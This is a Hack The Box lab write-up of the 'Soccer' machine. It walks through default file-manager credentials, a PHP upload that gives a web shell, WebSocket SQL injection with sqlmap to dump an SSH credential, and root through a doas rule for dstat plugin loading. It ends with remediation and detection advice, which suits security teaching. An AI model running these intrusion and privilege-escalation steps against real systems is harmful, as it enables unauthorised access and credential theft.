---
title: "Soccer — Tiny File Manager Upload and dstat Plugin Privilege Escalation"
description: "Default credentials on exposed file-management software and an executable upload provide a web-service shell; WebSocket SQL injection recovers an SSH credential, and a doas rule for dstat is abused through plugin loading to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - websocket
  - sql-injection
  - privilege-escalation
objective: "Chain default file-manager access, an executable upload, WebSocket SQL injection, and a delegated doas dstat rule into root."
tools:
  - rustscan
  - feroxbuster
  - netcat
  - curl
  - sqlmap
  - sqlmap-websocket-proxy
  - ssh
  - doas
  - dstat
skill: "Linux web foothold and privilege escalation through upload execution, database injection, and a delegated doas rule"
outcome: "Web-service code execution, an SSH credential recovered through WebSocket SQL injection, and root through dstat plugin loading under a doas rule"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu Linux; nginx 1.18.0; Tiny File Manager 2.4.3 |
| Starting position | Unauthenticated network access |
| Objective | From exposed file-management software to root through an executable upload, WebSocket SQL injection, and a delegated `dstat` rule |
| Outcome | Web-service shell, SSH access as a lab user, and a root context through `dstat` plugin loading |

## Default file manager to dstat root

Soccer is an Easy-rated Hack The Box Linux lab. Default credentials open Tiny File Manager, and the upload directory runs PHP. Local nginx configuration then reveals a second application virtual host whose ticket-checking WebSocket is injectable and discloses an SSH credential, and a `doas` rule permits `dstat`, whose Python plugin loading yields root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Tiny File Manager default access → upload-directory PHP execution → web-service shell → local nginx configuration → secondary virtual host → WebSocket ticket-check SQL injection → database credential recovery → SSH as lab user → delegated `doas` rule for `dstat` → Python plugin execution → root**

## Ubuntu host exposing SSH, nginx, and a WebSocket service

- **Target:** an Ubuntu Linux host running SSH, nginx, and an unidentified service on port 9091.
- **Exposed services:** SSH (22), HTTP (80), and a high port (9091) later identified as the ticket-checking WebSocket.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** follow documented paths from web access to privileged execution, showing how default configuration, an executable upload, an unvalidated WebSocket endpoint, and a delegated rule combine.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: default login, upload execution, and dstat plugin

### 1. Service and Content Discovery

Observation: a full TCP scan exposes three services, and HTTP redirects to a hostname-based site, so virtual-host handling is required before web enumeration is useful.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
feroxbuster --url http://<PRIMARY_VHOST> --wordlist <WORDLIST> -o <CONTENT_OUTPUT>
```

Truncated scan and discovery output:

```text
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux)
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
301      GET  /tiny => /tiny/
```

Significance: the redirect confines enumeration to the primary virtual host, and the discovered `/tiny` path exposes a file-management interface.

Result: SSH, nginx, and a high port are exposed, the primary virtual host is identified, and `/tiny` hosts an application.

### 2. Default-Credential Access to Tiny File Manager

Observation: `/tiny` hosts Tiny File Manager 2.4.3, and public documentation and common deployments ship with well-known default credentials.

Action: authenticated to the file manager with the documented default credentials, `<DEFAULT_USER>` / `<DEFAULT_PASSWORD>`.

```bash
curl -s -c cookies.txt -X POST http://<PRIMARY_VHOST>/tiny/ -d "fm_usr=<DEFAULT_USER>&fm_pwd=<DEFAULT_PASSWORD>"
```

The response confirmed the session:

```text
You are logged in

Tiny File Manager 2.4.3
```

Significance: default administrative credentials grant full file-management access, and the footer identifies the deployed version.

Result: authenticated administrative access to Tiny File Manager is obtained.

### 3. Executable Upload to Code Execution

Observation: the `/tiny/uploads` directory executes uploaded PHP files; a `phpinfo()` test confirmed that execution functions such as `system`, `exec`, `shell_exec`, and `proc_open` were available; the test output was not retained, so I could not verify it directly.

Action: with a listener ready, I checked that the upload directory executed server-side PHP, then uploaded a PHP file and requested it over HTTP.

```bash
nc -lvnp <LISTENER_PORT>
```

```bash
curl http://<PRIMARY_VHOST>/tiny/uploads/<UPLOADED_PHP>
```

The request returned a shell as the web-service account:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Significance: an upload directory that executes server-side code converts administrative file access into code execution under the web-service account.

Result: command execution as the web-service account is established.

### 4. Local Configuration Review

Observation: local socket and nginx configuration inspection showed a loopback database listener and a second enabled site.

```bash
ss -tulpn
ls -la /etc/nginx/sites-enabled/
```

```text
tcp LISTEN 0 151 127.0.0.1:3306 0.0.0.0:*
default
<SECONDARY_SITE>
```

Significance: reading web-server configuration exposes an application virtual host that was not reachable from initial external enumeration.

Result: a second application virtual host with login, signup, and ticket-checking functionality is identified.

### 5. WebSocket Ticket-Check SQL Injection

Observation: the ticket check is sent as a WebSocket message to port 9091, and its identifier field is SQL-injectable.

Action: proxied HTTP requests into the WebSocket message format so the SQL-injection tool could target the endpoint.

```bash
sqlmap-websocket-proxy -u ws://<SECONDARY_VHOST>:9091 -d '{"id":"%param%"}' -H "Origin: http://<SECONDARY_VHOST>"
sqlmap -u "http://localhost:<PROXY_PORT>/?param=1" --dump
```

```text
Database: <APPLICATION_DATABASE>
Table: <ACCOUNT_TABLE>
| <ID> | <LAB_USER_EMAIL> | <LAB_USER_PASSWORD> | <LAB_USER> |
```

Significance: the injectable identifier reached the backing database and disclosed an account credential; the WebSocket transport received the same lack of input handling as an HTTP parameter.

Result: a credential pair for `<LAB_USER>` is recovered from the application database.

### 6. SSH Access as the Lab User

Observation: the recovered credential authenticates the lab user over SSH.

```bash
ssh <LAB_USER>@<TARGET_HOST>
# password: <LAB_USER_PASSWORD>
```

```text
<LAB_USER>@<TARGET_HOST>:~$
```

Significance: the secret disclosed by the web application also satisfies host authentication, so the database disclosure becomes an interactive host session.

Result: the recovered credential is validated through SSH and an authenticated shell as `<LAB_USER>` is obtained.

### 7. Delegated doas Rule Discovery

Observation: a custom `doas` binary is present, and its configuration permits a passwordless root invocation of `dstat`.

```bash
find / -name "doas*" 2>/dev/null
```

```text
/usr/local/etc/doas.conf
```

The configuration grants the permission:

```text
permit nopass <LAB_USER> as root cmd /usr/bin/dstat
```

Significance: the rule delegates root execution of a single program, so the effective privilege depends on that program's behavior rather than its command name.

Result: a passwordless root `doas` rule for `dstat` is identified.

### 8. Root via dstat Plugin Loading

Observation: `dstat` loads external Python plugins from directories including `/usr/local/share/dstat/`.

Action: wrote a plugin into a directory `dstat` loads, then invoked the permitted program by plugin name through the `doas` rule.

```bash
echo '<PLUGIN_CODE>' > /usr/local/share/dstat/dstat_<PLUGIN_NAME>.py
doas -u root /usr/bin/dstat --<PLUGIN_NAME>
```

```text
# whoami
root
```

Significance: because `dstat` executes plugin code while running as root, the delegated rule is arbitrary root code execution.

Result: a root context is obtained through the permitted `dstat` command.

## WebSocket transport and a dstat-only doas rule

| Challenge | Decision | Rationale |
|---|---|---|
| The ticket check is transported as a WebSocket message, which the selected SQL-injection tool does not speak natively | Proxied HTTP requests into the WebSocket message format | Needed to drive the tool against the endpoint |
| The `doas` rule permits only `dstat`, not a shell | Invoked a plugin loaded by the permitted program | The binary's extension mechanism, not its command name, determined the available privilege |

## Outcome: web shell, SSH credential, and dstat root

The documented path starts with default-credential file-manager access, continues through code execution as the web-service account and a credential recovered through WebSocket SQL injection and validated over SSH, and ends with root through `dstat` plugin loading under a delegated `doas` rule.

## Recommendations: default credentials, executable uploads, WebSocket input, and doas scope

No recommendation in this section was tested during the lab.

1. **Default credentials on administrative software.** Known default credentials granted full file-management access. *Recommendation:* remove or rotate default credentials before deployment and restrict administrative interfaces to trusted access paths. *Detection:* alert when vendor-default accounts log in or administrative interfaces receive access from unexpected sources.
2. **Executable upload directory.** `/tiny/uploads` executed uploaded PHP, which gave code execution as the web-service account. *Recommendation:* store uploads outside executable paths and explicitly disable server-side execution in upload directories. *Detection:* alert when executable files are newly written under the web root.
3. **Unvalidated WebSocket endpoint.** The ticket-checking message reached the database without input handling and disclosed an account credential. *Recommendation:* apply parameterized queries and input validation to WebSocket handlers as well as HTTP routes. *Detection:* log and review WebSocket payloads for injection patterns.
4. **Over-broad `doas` delegation.** A passwordless root rule for `dstat` allowed arbitrary code execution through its plugin loading. *Recommendation:* review `sudo` and `doas` allowlists against the full behavior of each permitted program, and exclude binaries that load user-controlled extensions. *Detection:* audit delegation rules for plugin-capable or scriptable binaries and monitor plugin directories for unexpected files.

## References

- [Hack The Box — Soccer](https://app.hackthebox.com/machines/Soccer) (retired machine)
- [Tiny File Manager](https://github.com/prasathmani/tinyfilemanager) (default-credentials file manager)
- [sqlmap](https://sqlmap.org/) (SQL injection detection and exploitation)
- [sqlmap-websocket-proxy](https://pypi.org/project/sqlmap-websocket-proxy/) (HTTP-to-WebSocket proxy for sqlmap)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
- [dstat](https://github.com/dstat-real/dstat) (system statistics tool with external plugins)
- [doas](https://man.openbsd.org/doas) (OpenBSD execute-as delegation)
